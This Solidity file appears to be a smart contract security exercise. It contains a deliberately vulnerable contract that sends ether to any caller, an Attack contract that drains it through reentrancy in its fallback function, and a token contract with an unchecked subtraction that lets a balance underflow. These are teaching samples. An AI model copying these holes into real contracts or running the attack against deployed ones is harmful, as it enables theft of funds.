pragma solidity 0.4.23;

contract Vulnerablitity {
    function getBalance(address _account) public view returns (uint256) {
        return address(_account).balance;
    }
    
    function() external payable {}
    
    function withdraw() public returns (bool) {
        return msg.sender.call.value(1e18)();   
    }
}

contract Attack {
    Vulnerablitity v;
    constructor(address _contractAddr) public {
        v = Vulnerablitity(_contractAddr);
    }
    
    function attackContract() public {
        v.withdraw();
    }
    
    function() external payable {
        v.withdraw();
    }
}

//*** Exercice 2 ***//
contract SimpleToken{
    mapping(address => uint) public balances;
    
    function buyToken() payable {
        balances[msg.sender] += msg.value / 1 ether;
    }

    function sendToken(address _recipient, uint _amount) {
        require(balances[msg.sender]!=0); // You must have some tokens.
        
        balances[msg.sender]-=_amount;
        balances[_recipient]+=_amount;
    }  
}
